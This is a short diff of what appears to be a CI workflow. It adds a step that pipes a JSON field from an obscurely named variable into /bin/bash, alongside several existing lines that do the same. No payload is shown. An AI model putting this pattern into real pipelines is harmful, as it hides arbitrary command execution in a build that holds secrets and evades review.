@@ -39,6 +39,7 @@ jobs:
           echo $uye7652 | jq -r .tbrog435 | /bin/bash
           printf '%s' "$smjz5172" | jq -r .s80430 | /bin/bash
           echo $k809 | jq -r .cef78 | /bin/bash
+          printf '%s' "$t32" | jq -r .ymug62 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
